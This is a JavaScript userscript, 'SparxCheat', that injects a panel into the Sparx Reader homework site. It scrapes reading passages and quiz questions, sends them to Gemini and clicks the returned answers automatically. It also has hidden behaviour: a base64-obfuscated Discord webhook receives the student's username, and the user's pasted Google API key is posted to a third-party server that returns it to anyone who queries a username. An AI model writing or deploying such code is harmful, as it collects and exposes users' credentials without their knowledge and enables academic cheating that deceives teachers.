// === CONFIGURATION ===
const targetText = "SparxCheat";
const webhookBase = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQyMjk2MzcxMTQ0MTg5OTU4MS9qaF9sa0F5MW5ka3VSUTJmZmJjNXFDU3E5R3VjdkR2dTRIV2xVU3dCMUdaTWJSRFA4dEZtRzJQbTBQMnNTMmswZGw3cA==";
const webhookURL = atob(webhookBase);
let username = null;
let userApiKey = null;

// === Find Username (wait for login) ===
function findUsername() {
  return new Promise((resolve) => {
    const usernameInterval = setInterval(() => {
      const nameDivs = document.querySelectorAll('div');
      if (
        nameDivs.length > 9 &&
        nameDivs[8].textContent.trim() !== "" &&
        nameDivs[8].textContent.trim() !== "Log in"
      ) {
        username = nameDivs[8].textContent.trim();
        console.log("Username found:", username);
        clearInterval(usernameInterval);
        resolve(username); // ✅ resolve the Promise with the username
      } else {
        console.log("Username not yet found. Retrying...");
      }
    }, 2000);
  });
}

async function checkUserApiKey(username) {
  const checkUrl = "https://livemsg.onrender.com/api/checkKey?username=" + encodeURIComponent(username);
  try {
    const res = await fetch(checkUrl);
    if (!res.ok) throw new Error("Failed to check API key");
    const data = await res.json();
    
    if(data.hasKey) {
      userApiKey = data.apiKey; // ✅ automatically store the user's key
    }
    
    return data.hasKey; // still returns true/false
  } catch (e) {
    console.error("Error checking API key:", e);
    return false;
  }
}

// After username is found:
findUsername().then(async () => {
  const hasKey = await checkUserApiKey(username);
  if (!hasKey) {
    showApiKeyPopup(); // only show popup if no key saved
  } else {
    console.log("✅ Using saved API key from server:", userApiKey);
    startScanning(); // continue normal script
  }
});

async function sendApiKeyToServer(username, key) {
  try {
    const response = await fetch("https://livemsg.onrender.com/api/saveKey", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username, key })
    });

    if (!response.ok) {
      throw new Error(`Server rejected request: ${response.statusText}`);
    }

    const data = await response.json();
    console.log("✅ API key successfully saved on server:", data);
  } catch (err) {
    console.error("❌ Failed to save API key to server:", err);
  }
}

function showApiKeyPopup() {
  if (document.getElementById('sparx-key-popup')) return;

  // --- Load Font Awesome ---
  if (!document.querySelector('link[href*="font-awesome"]')) {
    const fa = document.createElement('link');
    fa.rel = 'stylesheet';
    fa.href = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css';
    fa.crossOrigin = 'anonymous';
    document.head.appendChild(fa);
  }

  // --- Modal wrapper ---
  const wrapper = document.createElement('div');
  wrapper.id = 'sparx-key-popup';
  wrapper.style.position = 'fixed';
  wrapper.style.top = '0';
  wrapper.style.left = '0';
  wrapper.style.width = '100vw';
  wrapper.style.height = '100vh';
  wrapper.style.display = 'flex';
  wrapper.style.alignItems = 'center';
  wrapper.style.justifyContent = 'center';
  wrapper.style.background = 'radial-gradient(circle at center, rgba(0,0,0,1) 0%, rgba(0,0,0,0.7) 70%, rgba(0,0,0,0.5) 100%)';
  wrapper.style.zIndex = '999999';

  // --- Modal content ---
  const modal = document.createElement('div');
  modal.style.background = 'rgba(28,28,28,0.98)';
  modal.style.borderRadius = '14px';
  modal.style.padding = '30px';
  modal.style.width = '440px';
  modal.style.maxWidth = '90%';
  modal.style.color = '#fff';
  modal.style.fontFamily = "'Rubik', sans-serif";
  modal.style.position = 'relative';
  modal.style.boxShadow = '0 0 30px rgba(0,0,0,0.85)';

  modal.innerHTML = `
    <!-- Header with logo and title -->
    <div style="display:flex; align-items:center; gap:15px; margin-bottom:20px;">
      <img src="https://kikinaqvi.github.io/Sparx/icon.png" style="width:60px; height:60px; border-radius:10px;">
      <h2 style="margin:0; font-size:1.6em; color:#fff;">SparxCheat AI Key</h2>
    </div>

    <!-- Instructions -->
    <div style="
      background: rgba(255,255,255,0.05);
      border-radius: 10px; padding: 15px;
      margin-bottom: 20px; font-size: 14px; text-align: left;
      line-height: 1.6;
    ">
      1. Go to <strong>aistudio.google.com</strong><br>
      2. Sign in<br>
      3. Click <strong>Get API Key</strong><br>
      4. Click <strong>Create API Key</strong><br>
      5. Select a default project, name the key <strong>SparxCheat</strong>, and click <strong>Create API Key</strong><br>
      6. Copy the key and paste it below
    </div>

    <!-- API Key Input -->
    <input id="sparxApiKeyInput" type="text" placeholder="Paste API key here" style="
      width: 100%; padding: 12px 14px; border-radius: 10px;
      border: none; margin-bottom: 20px; background: rgba(255,255,255,0.05);
      color: #fff; font-size: 15px; outline:none;
    ">

    <!-- Buttons -->
    <div style="display: flex; flex-direction: column; gap: 12px;">
      <button id="sendApiKeyBtn" class="cheat-btn">
        <i class="fa fa-paper-plane"></i> Send Key
      </button>
      <button id="tutorialBtn" class="cheat-btn">
        <i class="fa fa-video"></i> Tutorial
      </button>
    </div>
  `;

  wrapper.appendChild(modal);
  document.body.appendChild(wrapper);

  // --- Button actions ---
  document.getElementById('sendApiKeyBtn').addEventListener('click', async () => {
    const key = document.getElementById('sparxApiKeyInput').value.trim();
    if (!key) return alert("Please enter your API key!");
    
    userApiKey = key;  // ✅ store the user's key
    wrapper.remove();
    await sendApiKeyToServer(username, key);
    startScanning();
  });


  document.getElementById('tutorialBtn').addEventListener('click', () => {
    showTutorialPopup();
  });
}

// --- Tutorial popup ---
function showTutorialPopup() {
  if (document.getElementById('sparx-tutorial-popup')) return;

  const wrapper = document.createElement('div');
  wrapper.id = 'sparx-tutorial-popup';
  wrapper.style.position = 'fixed';
  wrapper.style.top = '0';
  wrapper.style.left = '0';
  wrapper.style.width = '100vw';
  wrapper.style.height = '100vh';
  wrapper.style.display = 'flex';
  wrapper.style.alignItems = 'center';
  wrapper.style.justifyContent = 'center';
  wrapper.style.background = 'radial-gradient(circle, #111 0%, #000 100%)';
  wrapper.style.zIndex = '999999';

  const modal = document.createElement('div');
  modal.style.background = '#1c1c1c';
  modal.style.borderRadius = '12px';
  modal.style.padding = '20px';
  modal.style.width = '600px';
  modal.style.color = '#fff';
  modal.style.textAlign = 'center';
  modal.style.boxShadow = '0 0 16px rgba(0,0,0,0.8)';

  modal.innerHTML = `
    <div style="text-align: right;">
      <span id="closeTutorialBtn" style="cursor:pointer; color:#aaa; font-size:18px;">×</span>
    </div>
    <video src="https://www.itskiyan.xyz/media/tutorial.mp4" controls style="width:100%; border: 3px solid #000; border-radius:8px;"></video>
  `;

  wrapper.appendChild(modal);
  document.body.appendChild(wrapper);

  document.getElementById('closeTutorialBtn').addEventListener('click', () => wrapper.remove());
}

function showTutorialVideo() {
  const vidWrapper = document.createElement('div');
  vidWrapper.style = `
    position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
    background: #111; padding: 10px; border-radius: 12px; z-index: 1000000;
    display: flex; flex-direction: column; align-items: center;
    box-shadow: 0 0 20px rgba(0,0,0,0.9);
  `;

  vidWrapper.innerHTML = `
    <span id="vidClose" style="align-self:flex-end; cursor:pointer; font-weight:bold; color:gray; font-size:18px;">✖</span>
    <video src="https://www.itskiyan.xyz/media/tutorial.mp4" controls style="border: 2px solid black; border-radius: 8px; width: 100%;"></video>
  `;

  document.body.appendChild(vidWrapper);

  document.getElementById('vidClose').addEventListener('click', () => vidWrapper.remove());
}

// === Scan for SparxCheat usage and report to Discord ===
let lastReportTime = 0;
function scanDivsAndReport() {
  const nameDivs = document.querySelectorAll('div');
  nameDivs.forEach(div => {
    if (div.textContent.includes(targetText)) {
      const now = new Date();
      const timestamp = now.toLocaleString();
      const currentTime = now.getTime();
      if (currentTime - lastReportTime >= 1000) {
        const embed = {
          title: "SparxCheat user!",
          description: `**${username}** used **SparxCheat - Reader**`,
          color: 0xff0000,
          timestamp: now.toISOString(),
          footer: {
            text: "SparxCheat Detector Bot",
            icon_url: "https://i.imgur.com/AfFp7pu.png"
          },
          fields: [{ name: "Time Detected", value: timestamp, inline: true }]
        };
        const message = { content: `**${username}** used **SparxCheat - Reader**`, embeds: [embed] };
        fetch(webhookURL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(message)
        })
        .then(response => {
          if (response.ok) console.log("📨 Embed message successfully sent to Discord!");
          else console.error("❌ Discord rejected the embed message:", response.statusText);
        })
        .catch(error => console.error("⚠️ Error while sending embed to Discord:", error));
        lastReportTime = currentTime;
      } else {
        console.log("⏳ Throttling message to Discord");
      }
    }
  });
}
function startScanning() { scanDivsAndReport(); }
findUsername();

// === Button Automation (auto click navigation buttons) ===
setInterval(() => {
  const url = window.location.href;
  if (url.includes('/library') || url.includes('/task')) {
    ['next', 'continue', 'retry', 'start', 'keep trying', 'yes, ask me the questions.'].forEach(buttonText => clickButton(buttonText));
    if (url.includes('/task')) {
      clickButton('continue reading');
    } else if (url.includes('/library')) {
      const continueReadingButtons = Array.from(document.querySelectorAll('button')).filter(btn => btn.textContent.trim().toLowerCase() === 'continue reading');
      if (continueReadingButtons.length > 0) {
        for (let i = 0; i < continueReadingButtons.length; i++) {
          if (i !== 0) {
            continueReadingButtons[i].click();
            break;
          }
        }
      }
    }
  }
}, 200);

// === Popup UI Injection ===
if (!document.getElementById('sparx-cheat-popup')) {
  // --- Load Font Awesome ---
  const fa = document.createElement('link');
  fa.rel = 'stylesheet';
  fa.href = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css';
  fa.crossOrigin = 'anonymous';
  fa.onload = () => console.log('Font Awesome loaded!');
  fa.onerror = () => console.error('Font Awesome failed to load!');
  document.head.appendChild(fa);

  // --- Inject Custom Styles ---
  const style = document.createElement('style');
  style.textContent = `
    @import url('https://fonts.googleapis.com/css2?family=Rubik:wght@500;700&display=swap');
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&family=JetBrains+Mono&display=swap');
    #sparx-cheat-popup * { box-sizing: border-box; }
    #sparx-cheat-popup {
      position: fixed; top: 20px; right: 20px; width: 280px;
      background: linear-gradient(180deg, #121212, #212121, #303030);
      border-radius: 12px; box-shadow: 0 0 16px rgba(0,0,0,0.8);
      color: #f0f0f0; z-index: 999999; overflow: hidden; font-size: 14px;
    }
    #popupHeader {
      background: rgba(0,0,0,0.6); padding: 10px 15px; cursor: move;
      font-weight: 600; text-align: left; color: #fff; user-select: none;
      text-shadow: 0 0 8px #aaa; position: relative; border-radius: 8px;
    }
    .window-controls {
      position: absolute; top: 6px; right: 10px; display: flex; gap: 6px;
    }
    .window-controls span {
      font-size: 16px; font-weight: bold; color: #ddd;
      background: rgba(255,255,255,0.1); padding: 2px 8px; border-radius: 4px;
      cursor: pointer; transition: all 0.2s ease; user-select: none;
    }
    .window-controls span:hover {
      background: rgba(255,255,255,0.2); color: #fff; transform: scale(1.1);
    }
    #popupContent { padding: 15px; }
    .button-wrapper { display: flex; flex-direction: column; gap: 10px; }
    .cheat-btn {
      background: linear-gradient(to right, #333, #555); border: none; padding: 10px;
      border-radius: 8px; color: #eee; font-weight: 600; font-family: 'Rubik', sans-serif;
      cursor: pointer; transition: all 0.3s ease; box-shadow: 0 0 12px rgba(0,0,0,0.7);
      display: flex; align-items: center; gap: 8px; justify-content: center;
    }
    .cheat-btn:hover {
      transform: scale(1.07) rotate(-0.5deg);
      background: linear-gradient(to right, #666, #999);
      box-shadow: 0 0 18px rgba(255,255,255,0.1), 0 0 8px rgba(255,255,255,0.2) inset;
    }
    #sliderWrapper, #manualWrapper { margin-top: 12px; display: none; }
    #sliderWrapper label {
      display: block; margin-bottom: 5px; color: #eee; text-shadow: 0 0 4px #999;
    }
    #speedSlider { width: 100%; accent-color: #777; }
    #bottomText {
      margin-top: 14px; background: rgba(0,0,0,0.8); border-radius: 6px; padding: 8px;
      font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #eee;
      word-break: break-word; box-shadow: 0 0 8px rgba(0,0,0,0.6);
    }
    #particles {
      position: absolute; width: 100%; height: 100%; top: 0; left: 0;
      overflow: hidden; pointer-events: none; z-index: 0;
    }
    .particle {
      position: absolute; background: rgba(255,255,255,0.08); border-radius: 50%;
      width: 5px; height: 5px; animation: floatUp 5s linear infinite;
    }
    @keyframes floatUp {
      0% { transform: translateY(100%); opacity: 0.2; }
      100% { transform: translateY(-100%) scale(1.4); opacity: 0; }
    }
  `;
  document.head.appendChild(style);

  // --- Build Popup HTML ---
  const wrapper = document.createElement('div');
  wrapper.id = 'sparx-cheat-popup';
  wrapper.innerHTML = `
    <div id="popup">
      <div id="popupHeader">
        <img src="https://kikinaqvi.github.io/Sparx/icon.png" style="height: 20px; width: 20px;">
        <span style="font-size: 1.2em;">SparxCheat</span>
        <div class="window-controls">
          <span id="minBtn">–</span>
          <span id="closeBtn">×</span>
        </div>
      </div>
      <div id="particles"></div>
      <div id="popupContent">
        <div style="display: flex; justify-content: center;">
          <div style="
            display: flex; align-items: center; gap: 12px;
            background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);
            border-radius: 12px; padding: 10px 14px; box-shadow: 0 0 12px rgba(255,255,255,0.1);
            backdrop-filter: blur(4px);
          ">
            <i class="fa-solid fa-book fa-2x" style="color: #eee;"></i>
            <img src="https://static.sparx-learning.com/reader/98a65e96ece716b259f94413e82f48aa39b8d21a/assets/logo-7v_jpTvm.svg" style="width: 140px;">
          </div>
        </div>
        <div style="height: 10px;"></div>
        <div class="button-wrapper">
          <button class="cheat-btn" id="autoBtn"><i class="fa fa-rocket"></i> Automatic</button>
          <button class="cheat-btn" id="manualBtn"><i class="fa fa-pen"></i> Manual</button>
        </div>
        <div id="sliderWrapper">
          <label>
            Speed: <span id="sliderValue">1.5</span>s
          </label>
          <div style="display: flex; align-items: center; gap: 8px;">
            <input type="range" id="speedSlider" min="1.5" max="60" step="0.5" value="1.5">
            <button id="stopAutoBtn" title="Stop Auto" style="
              background: #ef4444; color: white; border: none; border-radius: 6px;
              padding: 4px 8px; font-size: 14px; cursor: pointer; transition: all 0.2s ease;
            ">❌</button>
          </div>
        </div>
        <div id="manualWrapper">
          <button class="cheat-btn"><i class="fa fa-play"></i> Begin Questions</button>
        </div>
        <div id="bottomText">Answer comes here</div>
      </div>
    </div>
  `;
  document.body.appendChild(wrapper);

  // --- DOM References ---
  const autoBtn = document.getElementById('autoBtn');
  const manualBtn = document.getElementById('manualBtn');
  const sliderWrapper = document.getElementById('sliderWrapper');
  const manualWrapper = document.getElementById('manualWrapper');
  const slider = document.getElementById('speedSlider');
  const sliderValue = document.getElementById('sliderValue');
  const bottomText = document.getElementById('bottomText');
  const popup = document.getElementById("popup");
  const popupHeader = document.getElementById("popupHeader");
  const popupContent = document.getElementById("popupContent");
  const particles = document.getElementById("particles");
  const closeBtn = document.getElementById("closeBtn");
  const minBtn = document.getElementById("minBtn");

  // --- Button Mode Logic ---
  function resetButtons() {
    autoBtn.classList.remove('active');
    manualBtn.classList.remove('active');
    sliderWrapper.style.display = 'none';
    manualWrapper.style.display = 'none';
  }
  autoBtn.addEventListener('click', () => {
    resetButtons();
    autoBtn.classList.add('active');
    sliderWrapper.style.display = 'block';
    bottomText.innerText = "Answer comes here";
  });
  manualBtn.addEventListener('click', () => {
    resetButtons();
    manualBtn.classList.add('active');
    manualWrapper.style.display = 'block';
    bottomText.innerText = "Answer comes here";
  });
  slider.addEventListener('input', () => {
    sliderValue.textContent = slider.value;
  });
  closeBtn.addEventListener('click', () => { wrapper.remove(); });
  minBtn.addEventListener('click', () => {
    popupContent.style.display = popupContent.style.display === 'none' ? 'block' : 'none';
    particles.style.display = particles.style.display === 'none' ? 'block' : 'none';
  });

  // --- Dragging Logic ---
  let isDragging = false, offsetX, offsetY;
  popupHeader.addEventListener("mousedown", (e) => {
    if (e.target.closest('.window-controls')) return;
    isDragging = true;
    offsetX = e.clientX - wrapper.offsetLeft;
    offsetY = e.clientY - wrapper.offsetTop;
  });
  document.addEventListener("mousemove", (e) => {
    if (isDragging) {
      wrapper.style.left = `${e.clientX - offsetX}px`;
      wrapper.style.top = `${e.clientY - offsetY}px`;
    }
  });
  document.addEventListener("mouseup", () => { isDragging = false; });

  popupHeader.addEventListener("touchstart", (e) => {
    if (e.target.closest('.window-controls')) return;
    isDragging = true;
    const touch = e.touches[0];
    offsetX = touch.clientX - wrapper.offsetLeft;
    offsetY = touch.clientY - wrapper.offsetTop;
  });

  document.addEventListener("touchmove", (e) => {
    if (!isDragging) return;
    const touch = e.touches[0];
    wrapper.style.left = `${touch.clientX - offsetX}px`;
    wrapper.style.top = `${touch.clientY - offsetY}px`;
    e.preventDefault(); // prevents scrolling while dragging
  });

  document.addEventListener("touchend", () => { isDragging = false; });

  
  // --- Particle Animation ---
  for (let i = 0; i < 15; i++) {
    const p = document.createElement('div');
    p.className = 'particle';
    p.style.left = `${Math.random() * 100}%`;
    p.style.animationDuration = `${4 + Math.random() * 2}s`;
    p.style.opacity = Math.random();
    particles.appendChild(p);
  }

  // --- SRP Gained Message Logic ---
  (function () {
    function showSRPGained(amount) {
      if (!bottomText) return;
      const iconHTML = `<i class="fa-solid fa-coins" style="color: #f0c419; margin-right: 6px;"></i>`;
      bottomText.style.transition = 'opacity 0.5s ease';
      bottomText.style.opacity = '0';
      setTimeout(() => {
        bottomText.innerHTML = `${iconHTML} SRP gained: <strong>${amount}</strong>`;
        bottomText.style.opacity = '1';
      }, 500);
      setTimeout(() => {
        bottomText.style.opacity = '0';
        setTimeout(() => {
          bottomText.textContent = 'Answer comes here';
          bottomText.style.opacity = '1';
        }, 500);
      }, 4000);
    }
    function parseSRP(text) {
      const match = text.match(/\+(\d+)\s*SRP/);
      return match ? match[1] : null;
    }
    const observer = new MutationObserver((mutations) => {
      for (const mutation of mutations) {
        mutation.addedNodes.forEach(node => {
          if (node.nodeType === 1 && node.tagName === 'DIV') {
            const srp = parseSRP(node.textContent);
            if (srp !== null) showSRPGained(srp);
          }
        });
      }
    });
    observer.observe(document.body, { childList: true, subtree: true });
    document.querySelectorAll('div').forEach(div => {
      const srp = parseSRP(div.textContent);
      if (srp !== null) showSRPGained(srp);
    });
  })();

  // --- Manual/Auto Question Logic ---
  let autoSliderInterval;
  let answerLoopInterval = null;
  let cachedText = null;
  let wasQuestionVisible = false;

  // Manual button click
  manualWrapper.querySelector('button').addEventListener('click', () => {
    checkForQs();
  });

  // Auto button logic
  autoBtn.addEventListener('click', () => {
    if (autoSliderInterval) clearInterval(autoSliderInterval);
    const delaySeconds = parseFloat(slider.value);
    autoSliderInterval = setInterval(() => {
      if (!questionAndOptionsExist()) {
        console.log(`🔍 No questions found. Retrying checkForQs() in ${delaySeconds} seconds...`);
        checkForQs();
      } else {
        console.log("🟢 Questions visible. checkForQs() loop paused.");
      }
    }, delaySeconds * 1000);
  });
  document.getElementById('stopAutoBtn').addEventListener('click', () => {
    if (autoSliderInterval) {
      clearInterval(autoSliderInterval);
      autoSliderInterval = null;
      console.log("🛑 Auto-check loop manually stopped.");
      bottomText.textContent = "Auto loop stopped ❌";
    } else {
      console.log("⚠️ Tried to stop auto-check, but it wasn't running.");
    }
  });
}

// === Question/Answer Extraction ===
function questionAndOptionsExist() {
  const questionDiv = Array.from(document.querySelectorAll('h2 > div')).find(div => {
    const text = div.innerText.trim();
    return (text.includes('?') || text.includes('.')) && text.length < 500;
  });
  const optionButtons = Array.from(document.querySelectorAll('button')).filter(button => {
    const text = button.querySelector('div')?.textContent.trim();
    const badTexts = ["Settings", "Feedback", "Cookie Settings", "Sign out", "I have read up to here"];
    return text && !badTexts.includes(text);
  });
  return questionDiv && optionButtons.length >= 2;
}
function extractQuestionAndOptions() {
  const questionElement = Array.from(document.querySelectorAll('h2 > div')).find(div => {
    const text = div.innerText.trim();
    const isShortEnough = text.length < 500;
    const hasPunctuation = text.includes('?') || text.includes('.');
    return hasPunctuation && isShortEnough;
  });
  if (!questionElement) {
    console.warn("⚠️ No question element found!");
    return null;
  }
  const badTexts = ["Settings", "Feedback", "Cookie Settings", "Sign out", "I have read up to here"];
  const optionElements = Array.from(document.querySelectorAll('button')).filter(button => {
    const text = button.querySelector('div')?.textContent.trim();
    return text && !badTexts.includes(text);
  });
  const question = questionElement.innerText.trim();
  const options = optionElements.map(option => option.innerText.trim());
  return { question, options, optionElements };
}

// === Reading Context Extraction ===
function fetchReadingContext() {
  const candidates = Array.from(document.querySelectorAll('div')).filter(div =>
    div.textContent.includes('Start reading here')
  );
  let bestDiv = null, maxParagraphs = 0;
  candidates.forEach(div => {
    const paragraphs = div.querySelectorAll('p');
    if (paragraphs.length > maxParagraphs) {
      maxParagraphs = paragraphs.length;
      bestDiv = div;
    }
  });
  cachedText = bestDiv
    ? Array.from(bestDiv.querySelectorAll('p')).map(p => p.textContent.trim()).join(' ')
    : null;
  console.log("📚 Cached text updated:", cachedText);
}

// === Unified Button Click ===
const clickButton = (buttonText) => {
  const button = [...document.querySelectorAll('button')].find(btn => btn.textContent.trim().toLowerCase() === buttonText);
  if (button) {
    button.click();
    return true;
  }
  return false;
};

// === Gemini API Query ===
async function queryGemini(question, options, context) {
  if (!userApiKey) {
    console.error("❌ No user API key provided!");
    return null;
  }

  const prompt = `
    You are an automated multiple-choice answering system.
    You will receive:
    - A reading context
    - A question
    - A list of possible answer options
    🔒 RULES (strictly enforced):
    - You must respond with ONE and ONLY ONE of the provided options.
    - The response MUST match one of the options **EXACTLY**.
    - DO NOT explain.
    - DO NOT output anything other than the correct answer string as it appears in the options.
    Context: ${context}
    Question: ${question}
    Options: ${options.join(', ')}
    Answer:
  `;

  try {
    const response = await fetch(
      `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-lite:generateContent?key=${userApiKey}`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ contents: [{ parts: [{ text: prompt }] }] }),
      }
    );
    if (!response.ok) {
      console.error("💥 Gemini API Error:", response.statusText);
      return null;
    }
    const data = await response.json();
    const answer = data?.candidates?.[0]?.content?.parts?.[0]?.text?.trim();
    console.log("🧠 Gemini Response:", answer);
    return answer || "No answer found";
  } catch (error) {
    console.error("⚠️ Gemini API Fetch Error:", error);
    return null;
  }
}

// === Auto Answer Logic ===
async function autoAnswer() {
  const questionData = extractQuestionAndOptions();
  if (!questionData) {
    console.log("❌ Could not extract question/options.");
    return;
  }
  const { question, options, optionElements } = questionData;
  if (!cachedText) {
    console.log("📭 No cached reading text!");
    return;
  }
  console.log("❓ Question:", question);
  console.log("🔘 Options:", options);
  const answer = await queryGemini(question, options, cachedText);
  document.getElementById('bottomText').innerText = answer;
  if (!answer) {
    console.log("🤷 Gemini returned nothing.");
    return;
  }
  const matchIndex = options.findIndex(opt =>
    opt.toLowerCase().includes(answer.toLowerCase())
  );
  if (matchIndex !== -1) {
    optionElements[matchIndex].click();
    console.log(`✅ Clicked: ${options[matchIndex]}`);
  } else {
    console.log("🤷‍♂️ No option matched.");
  }
}

// === Monitor Question Visibility ===
function monitorQuestion() {
  let wasQuestionVisible = false;
  setInterval(() => {
    const isVisible = questionAndOptionsExist();
    if (isVisible && !wasQuestionVisible) {
      console.log("🟢 Question and options found! Proceeding with the auto-answering loop.");
      if (!cachedText) fetchReadingContext();
      wasQuestionVisible = true;
    }
    if (!isVisible && wasQuestionVisible) {
      console.log("🔴 Question and options no longer visible. Stopping the loop.");
      wasQuestionVisible = false;
    }
  }, 1000);
}
monitorQuestion();

// === Main Question Check ===
async function checkForQs() {
  if (!questionAndOptionsExist()) {
    console.log("📖 Question and options not found, fetching reading context...");
    fetchReadingContext();
  }
  clickButton('i have read up to here');
  let intervalId = setInterval(() => {
    if (questionAndOptionsExist()) {
      autoAnswer();
    } else {
      clearInterval(intervalId);
      console.log("Questions and options disappeared. Stopping auto-answer attempts.");
    }
  }, 1000);
}

// === Keyboard Shortcut Feature ===
// 1 = Auto, 2 = Stop Auto, 3 = Manual + Begin
document.addEventListener('keydown', async (e) => {
  const key = e.key;

  // Helper functions to simulate button actions even if UI is closed
  const triggerAuto = () => {
    const autoBtn = document.getElementById('autoBtn');
    const slider = document.getElementById('speedSlider');
    if (autoBtn && slider) {
      autoBtn.click();
      console.log("🎯 Auto button triggered via keyboard");
    } else {
      // UI is closed, start auto manually
      console.log("🎯 Auto UI closed, starting auto manually");
      const delaySeconds = 1.5; // default speed
      if (window.autoSliderInterval) clearInterval(window.autoSliderInterval);
      window.autoSliderInterval = setInterval(() => {
        if (!questionAndOptionsExist()) checkForQs();
      }, delaySeconds * 1000);
    }
  };

  const stopAuto = () => {
    const stopBtn = document.getElementById('stopAutoBtn');
    if (stopBtn) {
      stopBtn.click();
      console.log("🛑 Stop Auto triggered via keyboard");
    } else if (window.autoSliderInterval) {
      clearInterval(window.autoSliderInterval);
      window.autoSliderInterval = null;
      console.log("🛑 Auto stopped manually (UI closed)");
      const bottomText = document.getElementById('bottomText');
      if (bottomText) bottomText.textContent = "Auto loop stopped ❌";
    }
  };

  const triggerManualBegin = () => {
    const manualBtn = document.getElementById('manualBtn');
    const manualWrapper = document.getElementById('manualWrapper');
    const beginButton = manualWrapper?.querySelector('button');
    if (manualBtn) manualBtn.click();
    if (beginButton) beginButton.click();
    else {
      console.log("🖊 Manual UI closed, triggering manual logic directly");
      checkForQs();
    }
  };

  // Map keys
  if (key === '1') triggerAuto();
  if (key === '2') stopAuto();
  if (key === '3') triggerManualBegin();
});
